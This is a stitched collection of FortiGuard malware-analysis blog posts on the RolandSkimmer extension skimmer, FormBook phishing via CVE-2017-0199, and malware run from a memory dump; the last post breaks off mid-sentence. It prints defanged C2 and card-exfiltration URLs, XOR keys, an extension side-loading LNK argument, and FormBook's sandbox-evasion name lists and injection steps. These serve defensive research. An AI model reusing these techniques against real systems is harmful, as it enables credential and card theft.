then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands. Below is a network traffic example showing both the regular communication and the encoded commands received from the server. The encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts. First, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path. It then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments. To target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.” The following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities. The attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites. The extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions: This combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception. The background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code. To generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions. The script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—<imaage> instead of a valid <img> or <image> tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js. The background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.The retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.” The malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5). After detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden <a> elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft. Once the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number): hxxps://bg3dsec[.]com/<randomized str>?S=<useridentifier>-<site>&D=<captured form data>?&N=<credit card number> Attackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS). The critical component of this attack lies in the maliciously crafted LNK file with the following arguments: --load-extension=”%LOCALAPPDATA%\\s2ch97” ----mark-non-secure-as=disabled. The LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment. The attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.” These decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation. By leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled. Once all the browsers’ related settings are complete, mshta.exe is killed. Upon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented. These logs included status messages such as: These logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly. “RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information. The attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity.

    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Control and Collect Sensitive Information from a Victim’s DeviceSeverity level:Critical FortiGuard Labs recently observed a high-severity phishing campaign targeting old version Office Application users through malicious email attachments. The emails deliver an Excel file designed to exploit theCVE-2017-0199vulnerability, a known flaw in old version Microsoft Office's OLE (Object Linking and Embedding) functionality. The malware being spread in this campaign is FormBook, an information-stealing malware known for its ability to capture sensitive data, including login credentials, keystrokes, and clipboard information. Upon opening the malicious Excel file, the malware performs a series of operations, ultimately running the FormBook payload. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The phishing campaign starts with an email disguised as a sales order urging the recipient to open an attached Excel document. As shown in Figure 1, FortiMail has flagged the email as “[virus detected]” in the Subject line to warn the recipient. CVE-2017-0199 is a logic vulnerability found in older versions of the Office Application (Office 2007/2010 /2013 /2016). When a user opens the attached Office document targeting this vulnerability, the program sends an HTTP request to a remote server to retrieve a malicious HTA file. The program then uses COM objects to find the application/HTA file handler, which causes the Microsoft HTA application (mshta.exe) to load and execute the malicious script. Figure 2 shows how CVE-2017-0199 works: We opened the Office document from the email attachment using a compression program, which allowed us to directly view the OLE object content, as shown in Figure 3. If we had opened the Office document within a vulnerable version of Office, it would have triggered CVE-2017-0199, causing the download and execution of the linked content. As you can see, this is a very long URL. However, when accessing it normally, we don't need to pay attention to the content between the protocol and the '@' symbol. This allows us to obtain the actual URL we need. (hxxps[:]//agr[.]my/P6bJNr) Figure 4 shows the discovery of the shortened URL. When this link is accessed, it triggers a 302 redirect that jumps to the actual destination address. If you would like to learn this vulnerability in greater depth, this article provides a more thorough analysis:An Inside Look at CVE-2017-0199 – HTA and Scriptlet File Handler Vulnerability CVE-2017-0199 is a vulnerability dating back eight years, for which official patches have already been released. Nevertheless, due to the inherent challenges of vulnerability management and remediation—encompassing outdated software systems, overburdened IT teams, organizational negligence, or technical incompetence—organizations that fail to promptly update their systems, apply patches inconsistently, or implement security measures carelessly remain susceptible to exploitation of this vulnerability. We can see that the downloaded script is an HTA file (Figure 5), with its main execution logic being a segment of base64-encoded content. After decoding the base64 content, we found that its core functionality is to download a new file, place it in the %APPDATA% directory, and then execute it. (Figure 6) By analyzing sections of the obtained sample, we observed that its .rsrc section contains an unformatted resource data entry named “SCRIPT,” as shown in Figure 7. Examining its content revealed that it begins with the byte sequence “A3 48 4B BE 98 6C 4A A9 99 4C 53 0A 86 D6 48 7D”, which is characteristic of executable files generated by Aut2Exe from AutoIt scripts. Using a debugger for dynamic analysis, we attempted to examine how the sample decrypts the content of the SCRIPT resource and executes the payload, as shown in Figure 8. After initially reading and verifying the \"SCRIPT\" resource, the sample uses the IsDebuggerPresent API for anti-debugging measures, as shown in Figure 9. If it detects that the program is being debugged, it will only output, \"This is a third-party compiled AutoIt script.\" Afterwards, the sample reads the \"SCRIPT\" resource again and decrypts its contents, as shown in Figure 10. After thorough analysis, we discovered that the script decodes the encoded content using 0x1Em and extracts a file called “springmaker” from itself to the %TEMP% directory. It then calls CallWindowProc to run the decoded content, as shown in Figure 11. By examining the content of the “springmaker” file and decompiling what CallWindowProc executes, we discovered that the “springmaker” file is XORed with the string “3NQXSHDTVT2DPK06”, as shown in Figure 12. By applying the same XOR operation using that same string, we can restore the original file. At this point, we have finally obtained the core payload, which is the FormBook malware, as shown in Figure 13. If you would like to learn more about FormBook, here is a recent analysis:Infostealer Malware FormBook Spread via Phishing Campaign – Part II This is a serious phishing campaign targeting Windows users. The attackers send emails with malicious Excel attachments that exploit the CVE-2017-0199 vulnerability to deploy the FormBook malware. The attack process involves distributing malicious Excel files through phishing emails and exploiting CVE-2017-0199 to download and execute malicious HTA files. The HTA file downloads and executes \"sihost.exe,\" which in turn extracts \"springmaker.\" Finally, the \"springmaker\" file is decoded into the FormBook malware. The entire process is shown in Figure 14. This attack aims to take control of victims' devices and steal sensitive information, posing a significant threat. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, IPS, and AntiVirus services as follows: The relevant URLs are rated as “Malicious Websites” by theFortiGuard Web Filtering service.

    "link": "https://www.fortinet.com/blog/threat-research/deep-dive-into-a-dumped-malware-without-a-pe-header",
    "content": "FortiGuard Labs Threat Research This analysis is part of an incident investigation led by the FortiGuard Incident Response Team. We discovered malware that had been running on a compromised machine for several weeks. The threat actor had executed a batch of scripts and PowerShell to run the malware in a Windows process. Although obtaining the original malware executable was difficult, a memory dump of the running malware process and a full memory dump of the compromised machine (the “fullout” file, size 33GB) were successfully acquired. Figure 1 provides detailed file information about the dumped memory file, “fullout,” which we scanned to build a local test environment for analyzing the malware. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The malware was running within a dllhost.exe process with PID 8200. The dumped file is named pid.8200.vad.0x1c3eefb0000-0x1c3ef029fff.dmp. The file name reveals that the malware was loaded and deployed in memory at address range 0x1c3eefb0000 to 0x1c3ef029fff. The dumped file is a deployed 64-bit PE (Portable Executable) file. During execution, the Windows Loader reads and parses its DOS and PE headers to load and deploy the PE file. Once deployed, these headers are no longer needed. To evade dumping the malware into a file for analysis by researchers, some malware often corrupts these header regions by overwriting them with zeros (like this one) or random data. As shown in Figure 2, both the DOS and PE headers are corrupted, making it difficult to reconstruct the entire executable from memory. To dynamically analyze the malware, we needed to replicate the compromised system’s environment locally. This required launching the dllhost.exe process in a debugger to serve as a target process for deploying the dumped malware. This would allow us to analyze the malware within a local analysis environment. Preparing the malware to execute properly in this controlled setting involves several complicated steps. The first step is to locate the entry point function (the start function), which is the initial code executed when the malware is loaded into memory by the Windows Loader. While the offset of the entry point function is typically stored in the PE header, this was not the case. Instead, we had to manually locate the entry point (the start function). Based on our experience, the first instruction of the entry function is typically compiled as “sub rsp, 28h,” but other functions may also contain this instruction. However, by dumping the malware in IDA Pro, we were able to search for all occurrences of this instruction in the IDA Pro database. Fortunately, only eight instances of the instruction appeared in the malware (Figure 3). After analysis, we confirmed that the fourth function (at 0x1C3EEFEE0A8) is the entry point. In a newly launched dllhost.exe process, we manually executed some instructions to allocate memory for deploying the dumped malware, as seen in Figure 4. It calls a relevant VirtualAlloc() API with the same base address—0x1C3EEB70000—as seen in the compromised system. Once allocated, the dumped malware was copied into the newly created memory. A PE file’s Import table lists the Windows APIs it depends on. These API loading addresses differ on different Windows systems. To run and analyze the dumped malware in the local system, these addresses needed to be relocated to the ones loaded in the local system. Figure 5 shows part of the Windows API addresses from the Import Table. Based on our analysis, the final API address can be calculated from this information. For instance, the API address at 0x1C3EF0240D0 is 0x1C3EEEE1CE0, as shown in Figure 5. It calculates the API address as 0x7FFD74224630 by executing the following ASM code at address 0x1C3EEEE1CE0h: 001C3EEEE1CE0movr10, 0E528F49552F112B4h 001C3EEEE1CEAmovr11, 0E5288B6826D35484h 001C3EEEE1CF4xorr11, r10 001C3EEEE1CF7jmpr11; 0x7FFD74224630 Using the Volatility tool, we listed the loaded modules in the dllhost.exe process (PID 8200) from the “fullout” file. As you can see in Figure 6, the API at 0x7FFD74224630 is exported from module GDI32.dll. By dumping the GDI32.dll from the “fullout” file and analyzing it, we determined that the API at address 0x7FFD74224630 corresponds to GetObjectW() in the compromised system. In our local test environment, this same API resides at address 0x07FFFF77CB870. For this API,  its original address was replaced with the local address. This malware has 257 Windows APIs requiring relocation across 16 modules, including: kernel32.dll ws2_32.dll ntdll.dll gdi32.dll shlwapi.dll sspicli.dll user32.dll shell32.dll msvcrt.dll advapi32.dll, comctl32.dll crypt32.dll gdiplus.dll ole32.dll rpcrt4.dll userenv.dll For each API in the Import Table, its original address must be replaced with its corresponding local address using the same method used for API GetObjectW(). In addition, we needed to load all the required modules that were not automatically loaded by dllhost.exe. To do this, the API LoadLibraryA() or LoadLibraryW() with the module name must be called to load them into the malware’s memory. Figure 7 shows the malware running in a debugger. The RIP register points to the entry point's address at 0x1C3EEFEE0A8. The debugger also shows some of the relocated Windows API functions at the bottom. Based on our analysis, the malware also required some global variable data located at address 0x1C3EEB7000 with a size of 0x5A000 bytes. We extracted the required global data from the “fullout” file using the Volatility tool and the dd command. We again called the VirtualAlloc() API to allocate a new memory region within the dllhost.exe process at the desired address and size. After successful allocation, the extracted data was copied into the newly allocated memory space, as shown in Figure 8. Static analysis of the malware’s entry point function reveals that the function requires three parameters. The first parameter (RCX) is the base address of the loaded malware, which in this case is 0x1C3EEFB0000. The value of the second parameter (RDX) is 0x1. The third parameter (R8) is a pointer to a 0x30-byte buffer, which can also be extracted from the “fullout” file. We prepared all three parameters accordingly and allocated additional memory to store the 30H data for the third parameter, as illustrated in Figure 9. The last critical item is the correct alignment of the RSP register. When breaking at the entry point, the lowest four bits of the RSP value must be 0x8, as shown in Figure 9. Failing to align the RSP properly can trigger an exception of EXCEPTION_ACCESS_VIOLATION (code 0xC0000005) when the malware starts. This is due to a misalignment error, particularly when executing instructions like “movdqa,” which requires 16-byte alignment. In 64-bit code mode, before calling the entry point function, the RSP’s value is 16-byte aligned (the lowest four bits are 0x0). It pushes the return address onto the stack, and the RSP value is minus eight. To correct this, we adjusted the value from 0x09CAD11D850 to 0x09CAD11D848. After multiple trials, errors, and repeated fixes, we finally managed to run the malware in the local environment. Upon execution, the malware calls a function to decrypt its C2 server domain information stored in memory. As shown in Figure 10, the decryption function is displayed along with the newly decrypted domain details, including the domain (\"rushpapers.com\") and port number (\"443\"). The malware then establishes communication with its C2 server by creating a thread. As shown in Figure 11, it prepares to invoke the CreateThread() API with the thread function at 0x1C3EEFDE300. The newly created thread is responsible for handling communication with its C2 server. Part of the thread’s code is shown on the right side of Figure 11. After launching the thread, the main thread enters a sleep state until the communication thread completes its execution. As the decrypted domain port “443” indicates, the malware communicates with the C2 server over the TLS protocol. It uses the getaddrinfo() API to obtain the domain “rushpapers.com” IP address via a DNS query. Figure 12 is a Wireshark capture of the network traffic generated by the malware as it communicates with its C2 server. Since the TLS packet is encrypted, we need to inspect the data before encryption or after decryption to view the plaintext content. This can be done by setting breakpoints in a debugger on both encryption and decryption routines used by this malware. The malware leverages two API functions, SealMessage() and DecryptMessage(), to encrypt and decrypt the data for the TLS traffic. As you can see in Figure 13, the malware is preparing to encrypt an HTTP GET request using the SealMessage() API. Below are two examples of plaintext packets--one sent and one received--: Request packet (before TLS encryption): GET /ws/ HTTP/1.1 Host: rushpapers[.]com Connection: Upgrade Upgrade: websocket Sec-WebSocket-Version: 13 Sec-WebSocket-Key: OCnq155rYct3ykkkdLrjvQ== Response packet (after TLS decryption): HTTP/1.1 101 Switching Protocols Server: nginx/1.18.0 Date: Fri, 28 Mar 2025 06:13:24 GMT Connection: upgrade Upgrade: websocket Sec-WebSocket-Accept: Bzr0K1o6RJ4bYvvm4AM5AAG172Y= These two plaintext packets are used to complete a handshake-like process. Afterward, it switchesto a custom encryption algorithm to encrypt the packet data before applying TLS encryption. Below is an example of the data that has been encrypted using the custom algorithm. 0000000082 A6 16 98 5C 75 59 CB66 55 41 F1 32 11 79 EF‚¦ ˜\\uYËfUAñ2 yï 000000102F 55 27 A8 7C 5A 36 AE68 58 74 F1 28 55 3E A9/U'¨|Z6®hXtñ(U>© 000000206C 5B 26 B6 6D 4C 26 AC69 5C 1B 92l[&¶mL&¬i\\ ’ A clearer breakdown of the data is in the table below: Offset Length Description 00 01 Magic tag.0x82 01 Variable Variable-extended-length. 0xA6 for this case. 02 04 Encryption key. 16 98 5C 75 06 26H Encrypted data. 59 CB66 … 1B 92 According to the variable-extended-length rule, the data size is calculated as 0xA6-0x80=0x26. The encryption key (such as 0x755C9816) is a randomly generated number. The custom encryption’s algorithm performs a repeated XOR operation between each byte of the key and the encrypted data bytes. As a result, the decrypted data is as follows: 000000004F 53 3A 20 57 69 6E 646F 77 73 20 31 30 20 2FOS: Windows 10 / 0000001020 36 34 2D 62 69 74 2028 31 30 2E 30 2E 31 3964-bit (10.0.19 0000002030 34 35 29 0D 0A045) The decrypted data clearly reveals the system information from our local test environment: \"OS: Windows 10 / 64-bit (10.0.19045)\\r\\n”.

This section details the malware’s capabilities for controlling the compromised system. The malware has a feature that captures the victim’s screen as JPEG images and exfiltrates them to its C2 server. It also collects the title of the current active (topmost) program to provide context about what the user is doing at the time of capture. To do this, it calls a sequence of APIs, including CreateStreamOnHGlobal(), GdiplusStartup(), GetSystemMetrics(), CreateCompatibleDC(), CreateCompatibleBitmap(), BitBlt(), GdipCreateBitmapFromHBITMAP(), GdipSaveImageToStream(), and GdipDisposeImage(). Figure 14 shows how the malware captures the screenshot by calling these APIs. The malware includes a thread function designed to act as a server, listening on a TCP port specified by the C2 server. Once activated, this function allows the malware to await incoming connections from the attacker. It implements a multi-threaded socket architecture: each time a new client (attacker) connects, the malware spawns a new thread to handle the communication. This design enables concurrent sessions and supports more complex interactions. By operating in this mode, the malware effectively turns the compromised system into a remote-access platform, allowing the attacker to launch further attacks or perform various actions on behalf of the victim. The malware can enumerate and manipulate the system services on the infected machine. It achieves this by leveraging several Windows Service Control Manager (SCM) APIs, including OpenSCManagerW(), EnumServicesStatusExW(), ControlService(), and more. This analysis successfully demonstrated the deployment and dynamic analysis of malware with corrupted DOS and PE headers in a controlled local environment. The detailed process—from preparing the malware for execution, including memory allocation and API resolution, to correcting execution parameters—ensured accurate emulation of the malware’s behavior. Our investigation into the payload revealed its sophisticated communication with the C2 server, including secure encryption and decryption mechanisms using the SealMessage() and DecryptMessage() APIs. Finally, we confirmed the malware’s significant capabilities on the compromised system, such as screen capture, remote server functionality, and manipulation of system services via Service Control Manager APIs.

    "link": "https://www.fortinet.com/blog/threat-research/infostealer-malware-formbook-spread-via-phishing-campaign",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Fully remotely control the victim’s computerSeverity level:High This is part II of the FormBook analysis blog. In the previous post (Part I), I covered the campaign’s initialization via a phishing email, the CVE-2017-11882 vulnerability it exploited to execute an extracted 64-bit DLL, and the download and decryption of a FormBook variant hidden in a fake PNG file. Finally, I elaborated on how the 64-bit DLL mapped the FormBook payload in a target process (ImagingDevices.exe) and executed it using the process hollowing technique. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. In the second part of this analysis, you will learn how the FormBook payload operates on a comprised machine, including the complicated anti-analysis techniques employed by this FormBook variant, how the FormBook leverages Heaven’s Gate and randomly selected processes to evade analysis by cybersecurity researchers, the sensitive data it collects from the victim’s machine, how it communicates with the C2 server, and how it controls the victim’s system with control commands. The FormBook payload is a 32-bit executable that runs inside the 32-bit target process “ImagingDevices.exe”. My analysis reveals that the copied FormBook is re-encrypted. The code initially executed does not belong to the real FormBook but instead serves as a decryption routine. The encrypted data begins at offset 0x6E36C3 (with FormBook loaded at 0x6E0000), and the encrypted data size is hard coded to 0x43600, as illustrated in Figure 1. Next, it calculates the real entry point address from the decrypted code and stores it in the ESI register. This address will be called at the final stage, as shown in Figure 2. FormBook leverages multiple techniques to prevent being analyzed. I explain the main techniques used in this variant below. Figure 4 shows how it calls the ZwOpenDirectoryObject() API (0x2FE3580) inside the duplicated ntdll.dll. In my analysis environment, the original address for the API should be 0x76F43580. This is a module list loaded dynamically by FormBook by their index. Index Module Name 0x1 \"kernel32.dll\" 0x2 \"advapi32.dll\" 0x3 \"ws2_32.dll\" 0x4 \"rstrtmgr.dll\" 0x5 \"sqlite3.dll\" 0x6 \"winsqlite3.dll\" 0x7 \"crypt32.dll\" 0x8 \"vaultcli.dll\" 0x9 \"ole32.dll\" 0xA \"nss3.dll\" 0xB \"user32.dll\" 0xC \"shell32.dll\" FormBook then passes the decrypted module name to a function to load it using a low-level Windows API function, LdrLoadDll(). The desired Windows APIs are not hardcoded strings in FormBook but encrypted hash codes. FormBook traverses the APIs inside the loaded modules and matches their hash codes with the decrypted ones to find the desired APIs. As you can see in Figure 5, the PostThreadMessageW() API was obtained inside the EAX register from the “user32.dll” module. In this variant of FormBook, more than 100 key functions are encrypted by default and are decrypted only before calling. They are then re-encrypted after calling, which presents a challenge for static analysis. As shown on the left side of Figure 6, the SearchDecryptCode() function is called to search the encrypted code by locating the given start magic (6 bytes) and end magic (6 bytes). It then decrypts the located code. At 0x709B15, it calls sub_70DC33(), whose body is shown on the right side. The instructions enclosed by the red rectangle were just decrypted. After executing the dynamic function (sub_70DC33()), it calls ReEncryptCode(), at 0x709B26, to re-encrypt the function. To protect FormBook from being analyzed by auto-analysis platforms, it performs multiple detections. 1. Virtual Machines and Analysis Tools FormBook contains a predefined blacklist of encrypted hash codes, which are generated from process names associated with popular VM platforms or analysis tools, such as VMware (vmwareuser.exe, vmwareservice.exe), Sandboxie (sandboxiedcomlaunch.exe, sandboxierpcss.exe), Sysinternals tools (procmon.exe, regmon.exe, filemon.exe), network sniffers (wireshark.exe, netmon.exe), automation scripts (python.exe, perl.exe), and more. It retrieves all active processes from the victim’s system, generates a hash code from their process names, and compares them with a predefined set of blacklisted hash codes. The following code snippet demonstrates how it decrypts a hash code from 0x72FE2A27, which is 0x3EBE9086 generated from “vmwareuser.exe”. …… 006F642Aleaecx, [ebp+Dest]; Current process name. 006F6430pushecx 006F6431push3Ah; Decryption key. 006F6433push72FE2A27h; Encrypted hash code. 006F6438calldecrypt_fun; Decrypts a hash code. 006F643Daddesp, 8 006F6440pusheax; EAX holds the decrypted hash code, 0x3EBE9086, which is generated from “vmwareuser.exe”. 006F6441callmatch_hashcode; Compares with the current process. 006F6446addesp, 8 006F6449testeax, eax 006F644Bjnzanalysis_detected …… Once matched, it sets a global flag indicating it’s running in an analysis environment. 2. Detecting Sandbox Environments Some auto-analysis sandboxes run the target process from specific folders. FormBook detects this by retrieving the full path of the target process it hollowed into. In my analysis machine, it’s: “C:\\Program Files (x86)\\Windows Photo Viewer\\ImagingDevices.exe”. It then checks if the parent folder contains keywords from a blacklist by matching their hash codes. Examples include: “\\cuckoo\\”, “\\sandcastle\\”, “\\aswsnx\\”, “\\sandbox\\”, “\\smpdir\\”, “\\samroot\\”, and “\\avctestsuite\\” Below is an example of full path triggers detection: “C:\\cuckoo\\Windows Photo Viewer\\ImagingDevices.exe” 3. Windows Account Name It calls the Windows API RtlQueryEnvironmentVariable_U() with “USERNAME” as the variable name to retrieve the victim’s username. Figure 7 demonstrates the retrieved username after calling the API. It then generates a hash code from the username and compares it with those in a blacklist. FormBook assumes the usernames starting with certain patterns (e.g., “cuckoo”, “sandbox-“, “nmsdbox-“, and more) belong to auto-analysis systems. All of the above detection results are stored in global flags. FormBook checks these flags in a function and exits the process if any of them is set. It checks if a kernel-mode debugger (like Windbg) is enabled by calling the API NtQuerySystemInformation() with SystemKernelDebuggerInformation(0x23) system information class. Refer to Figure 8 for more details. If the KernelDebuggerEnabled is 1, it means a kernel debugger is present. It also determines if the user-mode debugger is present by passing ProcessDebugPort (0x7) as a ProcessInformationClass parameter to the ZwQueryInformationProcess() API. It returns 0xFFFFFFFF if a user-mode debugger is attached, such as x32dbg, which I used during the analysis. The Heaven’s Gate technique is a mechanism on Windows x64 systems that allows switching from 32-bit to 64-bit code inside a 32-bit process. It is also known as WoW64 (Windows-on-Windows 64-bit). This transition is the essence of “Heaven’s Gate.” The mechanism presents a significant challenge to cybersecurity researchers because a 32-bit debugger cannot debug 64-bit code, interrupting the debugging process. The Windows x64 architecture determines the execution mode based on the CS (Code Segment) register. In user mode (ring 3), 0x23 corresponds to the 32-bit code segment, while 0x33 corresponds to the 64-bit code segment. Executing an instruction like “jmp far 0x33:{address}” in a 32-bit process switches to 64-bit mode and executes 64-bit code from the {address}. This variant of FormBook uses the Heaven’s Gate technique multiple times, which will be explained in the following sections. FormBook randomly selects one of the explorer.exe child processes from active processes and leverages the Heaven’s Gate technique to manipulate the selected process. The malware first calls the NtQuerySystemInformation() API with the SystemProcessInformation (0x5) parameter to enumerate all active processes. It locates the PID (Process ID) of explorer.exe by comparing process name hash codes. Next, it scans the active processes to randomly choose a child process of explorer.exe by matching the active processes’ PPID (Parent Process ID) with the explorer.exe’s PID (Figure 9). After obtaining the process handle of the selected process (e.g., notepad.exe) by calling the NtOpenProcess() API, FormBook creates a shared memory between the two processes and copies the shellcode: It then utilizes the Heaven’s Gate technique to execute a piece of 64-bit code that had been copied and deployed in a newly allocated buffer. Figure 10 is about to execute “jmp far 33:2F30000”, where 0x33 is the new CS and 0x2F30000 is the new buffer’s address with the copied 64-bit code, as shown in the memory. Upon completion, it returns to 23:7107C0, which has already been pushed onto the top of the stack. My analysis reveals that the 64-bit code takes control of the selected process’s main thread (like notepad.exe) to execute a piece of injected malicious code. To control the selected process, it calls the NtOpenProcess() and ZwQueryInformationProcess() APIs to retrieve the process’ details. The APIs ZwOpenThread() and ZwSuspendThread() are called to pass the selected process’ information to suspend the main thread inside the selected process. In Figure 11, we can see that the 64-bit code just called ZwSuspendThread(), and in another debugger attached to the chosen process, it displays the suspended main thread. Subsequently, the 64-bit code copies the malicious payload into the selected process over the shared memory. It then calls NtGetContextThread() and NtSetContextThread() to modify the RIP register, redirecting the execution to the injected code. Finally, it calls the NtResumeThread() API to resume the main thread, causing the malicious code to run inside the selected process, notepad.exe. Execution then returns to the 32-bit code by executing a “retf” instruction. This time, the selected child process of explorer.exe is a Notepad.exe with the PID 9560. The copied malicious code is the same as the 64-bit code mentioned earlier, but it goes down different code branches depending on a returned flag. Twelve encrypted process names are saved in local variables, which can be obtained using a function with a string index. The table below lists all the processes and indexes. String Index Process Names 0x0 \"PATHPING.EXE\" 0x1 \"fontview.exe\" 0x2 \"MuiUnattend.exe\" 0x3 \"forfiles.exe\" 0x4 \"chkntfs.exe\" 0x5 \"find.exe\" 0x6 \"DpiScaling.exe\" 0x7 \"waitfor.exe\" 0x8 \"net.exe\" 0x9 \"icsunattend.exe\" 0xa \"cttune.exe\" 0xb \"whoami.exe\" These 32-bit processes all reside in the “C:\\Windows\\SysWOW64\\” folder. FormBook repeatedly launches these processes in a loop until one is successfully created. It then performs process hollowing on the process, injects the FormBook payload into the process (such as “PATHPING.EXE”), and executes it. As shown in Figure 12, it is about to call the CreateProcessInternalW() API to create a PATHPING.EXE process, with the dwCreationFlags parameter set to 0x800000C, indicating a suspended process will be created. It then creates a shared memory section between notepad.exe and PATHPING.EXE. At this point, the task of the code running in the selected process (notepad.exe) is completed. Switching to the target process (ImagingDevices.exe), it returns to the 32-bit code mode from the 64-bit code via Heaven’s Gate. It brings the full process information of the newly created PATHPING.EXE process using the shared memory established between it and the selected notepad.exe process. ImagingDevices.exe takes control of the PATHPING.EXE process and copies the FormBook payload into the PATHPING.EXE process via the shared memory section. As shown in Figure 14, the payload is encrypted and mapped into both processes’ memory, having been written by code running inside ImagingDevices.exe. Next, ImagingDevices.exe calls the NtSetContextThread() API to modify the PATHPING.EXE’s EAX register (which holds a thread function address to RtlUserThreadStart().) to redirect the execution to a specific function. This function decrypts the FormBook payload and calls the entry point function of the FormBook payload once the NtResumeThread() API is called. After employing numerous evasion techniques, FormBook finally hits the main payload within the PATHPING.EXE process, another 32-bit process. Based on my analysis, this process function acts as a dashboard program for FormBook. It gathers sensitive data from the victim’s system and manipulates another selected process to communicate with its C2 server. FormBook collects basic information from the victim’s device, such as the Windows product name, the current build, the username, and the computer name. Some are obtained from the system registry via API calls, while others are retrieved using the RtlQueryEnvironmentVariable_U() API. This information is then encrypted and saved in a global variable, which is later sent to the C2 server in an HTTP GET packet to register the infected system. As shown in Figure 15, the malware prepares to encrypt the collected basic information, where “XLNG…” is a magic string, “Windows 10 Enterprise x64” is the Windows product information, followed by the Base64-encoded computer name and user name. FormBook then randomly selects another child process of explorer.exe. Similar to what was done in the ImagingDevices.exe process, it invokes 64-bit code from the 32-bit process using the Heaven’s Gate technique. This 64-bit code copies and deploys the FormBook into the newly selected process (e.g., another notepad.exe process) and modifies the RIP register to point to the deployed FormBook at a different entry point. According to my analysis, this newly selected process acts as a socket process responsible for communicating with the C2 server. A large shared memory section is created and mapped into PATHING.EXE and the chosen data exchange process. When it returns to 32-bit mode (using Heaven’s Gate) in the PATHPING.EXE process, FormBook calls the PostThreadMessageW() API with a Msg parameter of 0x111 (WM_COMMAND) to send a message to the main thread of the selected process (like notepad.exe), as shown in Figure 16. Instead of calling NtResumeThread() to resume thread execution, FormBook sends a Windows message to activate the payload. Why does it send a message to run the FormBook as a socket process? As we know, most Windows programs are driven by Windows messages. Most of the time, a program remains idle because the message queue is empty—there is no user interaction (mouse, keyboard, etc.), system events, or other messages. The program waits (blocked by 